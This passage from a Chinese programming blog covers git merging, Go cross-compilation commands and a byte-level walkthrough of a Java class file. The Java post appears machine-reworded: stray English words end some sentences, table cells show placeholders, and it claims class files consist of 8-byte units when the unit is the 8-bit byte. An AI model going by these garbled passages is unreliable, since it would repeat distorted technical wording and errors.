<p>如果是自己一个开发就没有必要了，为了保险期间还是pull</p>
<p>然后我们把dev分支的代码合并到master上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git merge dev</span><br></pre></td></tr></table></figure>
<p>然后查看状态</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure>
<blockquote>
<p>On branch master<br>Your branch is ahead of ‘origin&#x2F;master’ by 12 commits.<br>(use “git push” to publish your local commits)<br>nothing to commit, working tree clean</p>
</blockquote>
<p>上面的意思就是你有12个commit，需要push到远程master上<br>执行下面命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/golang%E8%B7%A8%E5%B9%B3%E5%8F%B0%E7%BC%96%E8%AF%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/golang%E8%B7%A8%E5%B9%B3%E5%8F%B0%E7%BC%96%E8%AF%91/" class="post-title-link" itemprop="url">golang跨平台编译</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 10:03:40 / 修改时间：11:47:57" itemprop="dateCreated datePublished" datetime="2024-09-10T10:03:40+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="禁止内联"><a href="#禁止内联" class="headerlink" title="禁止内联"></a>禁止内联</h3><p><code>-gcflags=all=&#39;-l&#39;</code></p>
<h3 id="Mac-下编译-Linux-和-Windows-64位可执行程序"><a href="#Mac-下编译-Linux-和-Windows-64位可执行程序" class="headerlink" title="Mac 下编译 Linux 和 Windows 64位可执行程序"></a>Mac 下编译 Linux 和 Windows 64位可执行程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>

<h3 id="Linux-下编译-Mac-和-Windows-64位可执行程序"><a href="#Linux-下编译-Mac-和-Windows-64位可执行程序" class="headerlink" title="Linux 下编译 Mac 和 Windows 64位可执行程序"></a>Linux 下编译 Mac 和 Windows 64位可执行程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build main.go</span><br><span class="line">CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>


<h3 id="Windows-下编译-Mac-和-Linux-64位可执行程序"><a href="#Windows-下编译-Mac-和-Linux-64位可执行程序" class="headerlink" title="Windows 下编译 Mac 和 Linux 64位可执行程序"></a>Windows 下编译 Mac 和 Linux 64位可执行程序</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=darwin</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line">SET CGO_ENABLED=0</span><br><span class="line">SET GOOS=linux</span><br><span class="line">SET GOARCH=amd64</span><br><span class="line">go build main.go</span><br><span class="line">GOOS：目标平台的操作系统（darwin、freebsd、linux、windows）</span><br><span class="line">GOARCH：目标平台的体系架构（386、amd64、arm）</span><br></pre></td></tr></table></figure>
<p>交叉编译不支持 CGO 所以要禁用它<br>上面的命令编译 64 位可执行程序，你当然应该也会使用 386 编译 32 位可执行程序<br>很多博客都提到要先增加对其它平台的支持，但是我跳过那一步，上面所列的命令也都能成功，且得到我想要的结果，可见那一步应该是非必须的，或是我所使用的 Go 版本已默认支持所有平台。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://ihongren.github.io/2024/09/10/java-%E5%AD%97%E8%8A%82%E7%A0%81%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar2.gif">
      <meta itemprop="name" content="gelen">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gelen's blog">
      <meta itemprop="description" content="一个酷爱编程的安全工程师">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | gelen's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/09/10/java-%E5%AD%97%E8%8A%82%E7%A0%81%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">java 字节码知识</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-09-10 10:03:03 / 修改时间：11:47:57" itemprop="dateCreated datePublished" datetime="2024-09-10T10:03:03+08:00">2024-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="class文件中的数据类型"><a href="#class文件中的数据类型" class="headerlink" title="class文件中的数据类型"></a>class文件中的数据类型</h2><p>每一个class文件都是由8个字节为单位的字节流构成，class文件格式采用相似于C语言结构体的伪结构来描述，在这种伪结构中只有两种数据类型：无符号数和表。数组</p>
<ul>
<li>无符号数<br>无符号数使用u一、u二、u4和u8分别表示1个字节、2个字节、4个字节和8个字节的无符号数。</li>
<li>表<br>表是由无符号数和其余表做为数据项构成的数据结构。表常常以“_info”后缀表示。</li>
</ul>
<h2 id="class文件结构"><a href="#class文件结构" class="headerlink" title="class文件结构"></a>class文件结构</h2><p>class文件结构以下表：bash</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>名称</th>
<th>数量</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>content1</td>
<td>content2</td>
<td>content3</td>
<td></td>
</tr>
</tbody></table>
<p>u4	magic	1	魔数<br>u2	minor_version	1	副版本号<br>u2	major_version	1	主版本号<br>u2	constant_pool_count	1	常量池计数器<br>cp_info	constant_pool	constant_pool_count-1	常量池<br>u2	access_flags	1	类的访问标志<br>u2	this_class	1	类在常量池中的索引<br>u2	super_class	1	父类在常量池中的索引<br>u2	interfaces_count	1	接口计数器，直接父接口的数量<br>u2	interfaces	interfaces_count	接口表<br>u2	fields_count	1	字段计数器<br>field_info	fields	fields_count	字段表<br>u2	methods_count	1	方法计数器<br>method_info	methods	methods_count	方法表<br>u2	attributes_count	1	属性计数器<br>attribute_info	attributes	attributes_count	属性表<br>下面根据一个HelloWorld程序具体分析下class文件。<br>源码HelloWorld.java数据结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package com.xh.hello;</span><br><span class="line"></span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line">    private static int abc = 123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        printABC();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void printABC() &#123;</span><br><span class="line">        System.out.println(abc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用javac编译该源文件javac com&#x2F;xh&#x2F;hello&#x2F;HelloWorld.java，获得HelloWorld.class文件。使用十六进制文件查看器查看此文件内容。oracle</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cafe babe 0000 0034 0023 0a00 0700 140a</span><br><span class="line">0006 0015 0900 1600 1709 0006 0018 0a00</span><br><span class="line">1900 1a07 001b 0700 1c01 0003 6162 6301</span><br><span class="line">0001 4901 0006 3c69 6e69 743e 0100 0328</span><br><span class="line">2956 0100 0443 6f64 6501 000f 4c69 6e65</span><br><span class="line">4e75 6d62 6572 5461 626c 6501 0004 6d61</span><br><span class="line">696e 0100 1628 5b4c 6a61 7661 2f6c 616e</span><br><span class="line">672f 5374 7269 6e67 3b29 5601 0008 7072</span><br><span class="line">696e 7441 4243 0100 083c 636c 696e 6974</span><br><span class="line">3e01 000a 536f 7572 6365 4669 6c65 0100</span><br><span class="line">0f48 656c 6c6f 576f 726c 642e 6a61 7661</span><br><span class="line">0c00 0a00 0b0c 0010 000b 0700 1d0c 001e</span><br><span class="line">001f 0c00 0800 0907 0020 0c00 2100 2201</span><br><span class="line">0017 636f 6d2f 7868 2f68 656c 6c6f 2f48</span><br><span class="line">656c 6c6f 576f 726c 6401 0010 6a61 7661</span><br><span class="line">2f6c 616e 672f 4f62 6a65 6374 0100 106a</span><br><span class="line">6176 612f 6c61 6e67 2f53 7973 7465 6d01</span><br><span class="line">0003 6f75 7401 0015 4c6a 6176 612f 696f</span><br><span class="line">2f50 7269 6e74 5374 7265 616d 3b01 0013</span><br><span class="line">6a61 7661 2f69 6f2f 5072 696e 7453 7472</span><br><span class="line">6561 6d01 0007 7072 696e 746c 6e01 0004</span><br><span class="line">2849 2956 0021 0006 0007 0000 0001 000a</span><br><span class="line">0008 0009 0000 0004 0001 000a 000b 0001</span><br><span class="line">000c 0000 001d 0001 0001 0000 0005 2ab7</span><br><span class="line">0001 b100 0000 0100 0d00 0000 0600 0100</span><br><span class="line">0000 0300 0900 0e00 0f00 0100 0c00 0000</span><br><span class="line">2000 0000 0100 0000 04b8 0002 b100 0000</span><br><span class="line">0100 0d00 0000 0a00 0200 0000 0700 0300</span><br><span class="line">0800 0a00 1000 0b00 0100 0c00 0000 2600</span><br><span class="line">0200 0000 0000 0ab2 0003 b200 04b6 0005</span><br><span class="line">b100 0000 0100 0d00 0000 0a00 0200 0000</span><br><span class="line">0b00 0900 0c00 0800 1100 0b00 0100 0c00</span><br><span class="line">0000 1e00 0100 0000 0000 0610 7bb3 0004</span><br><span class="line">b100 0000 0100 0d00 0000 0600 0100 0000</span><br><span class="line">0400 0100 1200 0000 0200 13</span><br></pre></td></tr></table></figure>

<p>使用 javap -verbose com.xh.hello.HelloWorld指令解析该类，获得以下内容，配合class文件一块儿分析。app</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">Classfile /Users/maogong.han/java_tmp/com/xh/hello/HelloWorld.class</span><br><span class="line">  Last modified 2019-3-21; size 555 bytes</span><br><span class="line">  MD5 checksum 4b275a3e082827230300dcb233141209</span><br><span class="line">  Compiled from &quot;HelloWorld.java&quot;</span><br><span class="line">public class com.xh.hello.HelloWorld</span><br><span class="line">  minor version: 0</span><br><span class="line">  major version: 52</span><br><span class="line">  flags: ACC_PUBLIC, ACC_SUPER</span><br><span class="line">Constant pool:</span><br><span class="line">   #1 = Methodref #7.#20 // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">   #2 = Methodref #6.#21 // com/xh/hello/HelloWorld.printABC:()V</span><br><span class="line">   #3 = Fieldref #22.#23 // java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">   #4 = Fieldref #6.#24 // com/xh/hello/HelloWorld.abc:I</span><br><span class="line">   #5 = Methodref #25.#26 // java/io/PrintStream.println:(I)V</span><br><span class="line">   #6 = Class #27 // com/xh/hello/HelloWorld</span><br><span class="line">   #7 = Class #28 // java/lang/Object</span><br><span class="line">   #8 = Utf8 abc</span><br><span class="line">   #9 = Utf8 I</span><br><span class="line">  #10 = Utf8 &lt;init&gt;</span><br><span class="line">  #11 = Utf8 ()V</span><br><span class="line">  #12 = Utf8 Code</span><br><span class="line">  #13 = Utf8 LineNumberTable</span><br><span class="line">  #14 = Utf8 main</span><br><span class="line">  #15 = Utf8 ([Ljava/lang/String;)V</span><br><span class="line">  #16 = Utf8 printABC</span><br><span class="line">  #17 = Utf8 &lt;clinit&gt;</span><br><span class="line">  #18 = Utf8 SourceFile</span><br><span class="line">  #19 = Utf8 HelloWorld.java</span><br><span class="line">  #20 = NameAndType #10:#11 // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">  #21 = NameAndType #16:#11 // printABC:()V</span><br><span class="line">  #22 = Class #29 // java/lang/System</span><br><span class="line">  #23 = NameAndType #30:#31 // out:Ljava/io/PrintStream;</span><br><span class="line">  #24 = NameAndType #8:#9 // abc:I</span><br><span class="line">  #25 = Class #32 // java/io/PrintStream</span><br><span class="line">  #26 = NameAndType #33:#34 // println:(I)V</span><br><span class="line">  #27 = Utf8 com/xh/hello/HelloWorld</span><br><span class="line">  #28 = Utf8 java/lang/Object</span><br><span class="line">  #29 = Utf8 java/lang/System</span><br><span class="line">  #30 = Utf8 out</span><br><span class="line">  #31 = Utf8 Ljava/io/PrintStream;</span><br><span class="line">  #32 = Utf8 java/io/PrintStream</span><br><span class="line">  #33 = Utf8 println</span><br><span class="line">  #34 = Utf8 (I)V</span><br><span class="line">&#123;</span><br><span class="line">  public com.xh.hello.HelloWorld();</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=1, locals=1, args_size=1</span><br><span class="line">         0: aload_0</span><br><span class="line">         1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">         4: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 3: 0</span><br><span class="line"></span><br><span class="line">  public static void main(java.lang.String[]);</span><br><span class="line">    descriptor: ([Ljava/lang/String;)V</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=0, locals=1, args_size=1</span><br><span class="line">         0: invokestatic  #2 // Method printABC:()V</span><br><span class="line">         3: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 7: 0</span><br><span class="line">        line 8: 3</span><br><span class="line"></span><br><span class="line">  static &#123;&#125;;</span><br><span class="line">    descriptor: ()V</span><br><span class="line">    flags: ACC_STATIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=1, locals=0, args_size=0</span><br><span class="line">         0: bipush        123</span><br><span class="line">         2: putstatic     #4 // Field abc:I</span><br><span class="line">         5: return</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line 4: 0</span><br><span class="line">&#125;</span><br><span class="line">SourceFile: &quot;HelloWorld.java&quot;</span><br></pre></td></tr></table></figure>

<h3 id="魔数与class文件版本号"><a href="#魔数与class文件版本号" class="headerlink" title="魔数与class文件版本号"></a>魔数与class文件版本号</h3><p>魔数是class文件的前4个字节，是一个固定值:0xcafebabe。该值惟一的做用就是表示文件是否能够被JVM接受，不严格的说就是表示该文件是不是class文件。<br>版本号<br><img src="https://ewr1.vultrobjects.com/imgur1/000/001/680/238_738_c46.jpg" alt="Description"></p>
<h3 id="常量池"><a href="#常量池" class="headerlink" title="常量池"></a>常量池</h3><ul>
<li>常量池计数器</li>
</ul>
<p>常量池计数器表示常量池中的项的个数，在class文件中的位置是主版本号以后的2个字节，也就是第9和第10个字节。常量池计数器是从1开始的，在constant_pool表中，只有索引大于0且小于constant_pool_count的项才是有效的。<br>本例中constant_pool_count的值是0x0023，换算成十进制是35，表示constant_pool中有34项，有效索引是1到34，恰好是用javap解析出来的34个常量。</p>
<ul>
<li>常量池</li>
</ul>
<p>class文件中，constant_pool_count以后紧接着就是常量池的内容。每一个常量池项(cp_info)都是由一个u1类型的tag和一个具体类型的表构成，具体类型由tag的值决定。以下表：</p>
<table>
<thead>
<tr>
<th>tag值</th>
<th>对应的类型</th>
</tr>
</thead>
<tbody><tr>
<td>content1</td>
<td>content2</td>
</tr>
</tbody></table>
<p>7	CONSTANT_Class_info<br>9	CONSTANT_Fieldref_info<br>10	CONSTANT_Methodref_info<br>11	CONSTANT_InterfaceMethodref_info<br>8	CONSTANT_String_info<br>3	CONSTANT_Integer_info<br>4	CONSTANT_Float_info<br>5	CONSTANT_Long_info<br>6	CONSTANT_Double_info<br>12	CONSTANT_NameAndType_info<br>1	CONSTANT_Utf8_info<br>15	CONSTANT_MethodHandle_info<br>16	CONSTANT_MethodType_info<br>18	CONSTANT_InvokeDynamic_info<br>截取上文反编译出来的常量池部分信息，来分析常量池中的第一个常量。jvm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#1 = Methodref #7.#20 // java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span><br><span class="line">#7 = Class #28 // java/lang/Object</span><br><span class="line">#10 = Utf8 &lt;init&gt;</span><br><span class="line">#11 = Utf8 ()V</span><br><span class="line">#20 = NameAndType #10:#11 // &quot;&lt;init&gt;&quot;:()V</span><br><span class="line">#28 = Utf8 java/lang/Object</span><br></pre></td></tr></table></figure>
<p><img src="https://ewr1.vultrobjects.com/imgur1/000/001/680/240_32d_d6a.jpg" alt="Description"><br>“#1”表示常量池中索引是1。class文件中的0x0a位置开始。类型是Methodref。Methodref类型的结构以下：ui</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONSTANT_Methodref_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 class_index;</span><br><span class="line">    u2 name_and_type_index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Methodref中tag的值为0x0a，十进制为10，正好表示CONSTANT_Methodref_info类型。<br>class_index的值为0x0007，十进制为7，指向索引为7的常量池的项。#7是CONSTANT_Class_info类型，指向CONSTANT_Utf8_info类型的#28，表示此常量属于java&#x2F;lang&#x2F;Object的。<br>name_and_type_index的值为0x0014，十进制为20，指向索引为20的常量池的项，此项是NameAndType（字段或方法）类型，方法名索引（name_index）指向常量池的#10，为一个CONSTANT_Utf8_info类型，表示方法名为”<init>“；NameAndType的方法描述索引（descriptor_index）指向常量池的#11，表示无参类型。this</p>
<p>CONSTANT_Class_info类型结构:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONSTANT_Class_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 name_index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>tag值为7，表示是CONSTANT_Class_info类型。 name_index是指向常量池中一个类型为CONSTANT_Utf8_info的常量索引，表示类或者接口的名字。</p>
<p>CONSTANT_Utf8_info类型结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONSTANT_Utf8_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 length;</span><br><span class="line">    u1 bytes[length];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>tag值为1，表示CONSTANT_Utf8_info类型。bytes指的是字符串值的bytes数组。 bytes表示的字符串和十六进制转换可由下程序完成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public static String printHexString(byte[] b) &#123;</span><br><span class="line">        StringBuilder sb = new StringBuilder();</span><br><span class="line">        for (int i = 0; i &lt; b.length; i++) &#123;</span><br><span class="line">            String hex = Integer.toHexString(b[i] &amp; 0xFF);</span><br><span class="line">            if (hex.length() == 1) &#123;</span><br><span class="line">                hex = &#x27;0&#x27; + hex;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(hex);</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>上文提到的各项类型结构和说明可参考《Java虚拟机规范》。</p>
<h3 id="访问标志符"><a href="#访问标志符" class="headerlink" title="访问标志符"></a>访问标志符</h3><p>在常量池以后，紧挨着是占2个字节的访问标志符：0x0021。<br>ACC_PUBLIC(0x0001)+ACC_SUPER (0x0020)。<br>access_flags表示类或接口的访问权限。其取值和含义见下表：</p>
<table>
<thead>
<tr>
<th>标记名</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>content1</td>
<td>content2</td>
<td>content3</td>
</tr>
</tbody></table>
<p>ACC_PUBLIC	0x0001	为public类型<br>ACC_FINAL	0x0010	是否为final类型，只有类可设置<br>ACC_SUPER	0x0020	当用到invokespecial指令时，是否须要特殊处理的父类方法<br>ACC_INTERFACE	0x0200	标识接口，不是类<br>ACC_ABSTRACT	0x0400	标识是否为abstract，是否能够实例化<br>ACC_SYNTHETIC	0x1000	标识并不是由Java源码生成的代码，而是由编译器生成的<br>ACC_ANNOTATION	0x2000	注解类型<br>ACC_ENUM	0x4000	枚举类型</p>
<h3 id="类索引、父类索引和接口索引"><a href="#类索引、父类索引和接口索引" class="headerlink" title="类索引、父类索引和接口索引"></a>类索引、父类索引和接口索引</h3><p>访问标记符以后，紧接着是类索引、父类索引和接口索引。<br>类索引和父类索引都是一个u2类型的数据，接口索引是一组u2类型数据的集合。他们的值都表示在常量池中的索引。另外这三项数据肯定了类的关系：单继承、多实现。</p>
<p>类索引（this_class）<br>类索引在常量池中的索引值为0x0006，十进制为6，指向一个CONSTANT_Class_info类型的常量，其tag值为7，name_index指向27的索引。<br>#6 &#x3D; Class #27 &#x2F;&#x2F; com&#x2F;xh&#x2F;hello&#x2F;HelloWorld<br>#27 &#x3D; Utf8 com&#x2F;xh&#x2F;hello&#x2F;HelloWorld<br>复制代码</p>
<p>父类索引（super_class）<br>类索引以后，是父类索引。在常量池中的索引值为0x0007，十进制为7，指向一个CONSTANT_Class_info类型的常量，其tag值为7，name_index指向28的索引。<br>#7 &#x3D; Class #28 &#x2F;&#x2F; java&#x2F;lang&#x2F;Object<br>#28 &#x3D; Utf8 java&#x2F;lang&#x2F;Object<br>复制代码</p>
<p>接口索引(interfaces) 在父类索引以后的内容是接口索引计数器(interfaces_count)和接口索引表(interfaces)，class文件中interfaces_count的值为0x0000，表示未实现任何接口，这里不在讨论。</p>
<h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><p>在接口索引表以后是字段索引计数器和字段索引表。字段索引计数器是一个u2类型的数值，class文件中的值为0x0001，表示有一个字段。<br>字段表中的每项都表示指向常量池中的一个索引，该索引指向一个field_info结构的数据。字段表描述当前类或接口声明的全部字段，但不包括从父类或接口中继承过来的。</p>
<p>field_info {<br>  u2 access_flags;<br>  u2 name_index;<br>  u2 descriptor_index;<br>  u2 attributes_count;<br>  attribute_info attrubutes[attributes_count];<br>}<br>复制代码<br>access_flags项定义字段的访问权限和基础属性，以下表：<br>字段access_flags表：</p>
<p>标记名	值	说明<br>ACC_PUBLIC	0x0001	public，字段能够被从任何package访问<br>ACC_PRIVATE	0x0002	private，字段只能够被该类自身访问<br>ACC_PROTECTED	0x0004	protected，字段能够被子类访问<br>ACC_STATIC	0x0008	static，静态字段<br>ACC_FINAL	0x0010	final，字段定义后没法修改<br>ACC_VOLATILE	0x0040	volatile字段<br>ACC_TRANSIENT	0x0080	transient，是否被序列化<br>ACC_SYNTHETIC	0x1000	是否编译器自动生成<br>ACC_ENUM	0x4000	是否为枚举<br>name_index项是常量池的一个索引，该索引指向一个CONSTANT_Utf8_info类型，表示字段的非全限定名。<br>descriptor_index项是常量池的一个索引，该索引指向一个CONSTANT_Utf8_info类型，表示字段的描述符。<br>字段描述符以下表：<br>字符	类型	说明<br>B	byte	<br>C	char	<br>D	double	<br>F	float	<br>I	int	<br>J	long	<br>S	short	<br>Z	boolean	<br>LClassname	reference	一个Classname的实例<br>[	reference	一个一维数组<br>attribute_info表示的是字段的附加属性。<br>本例class文件中access_flags的值为0x000a：ACC_PRIVATE(0x0002) + ACC_STATIC(0x0008)。name_index的值为0x0008，指向常量池的索引为8。descriptor_index的值为0x0009，指向常量池的索引为9。附加属性的值为0x0000，表示没有属性。综上该字段是一个被private和static修饰的int类型的字段，名称是”abc”。</p>
<p>#8 &#x3D; Utf8 abc<br>#9 &#x3D; Utf8 I<br>复制代码</p>
<h3 id="方法区域"><a href="#方法区域" class="headerlink" title="方法区域"></a>方法区域</h3><p>字段以后，紧接着是方法区域。有方法计数器(methods_count)和方法表(methods)。方法计数器是一个u2类型的数值，本例class中值为0x0004，表示有4个方法。方法表中每一项都是method_info结构。</p>
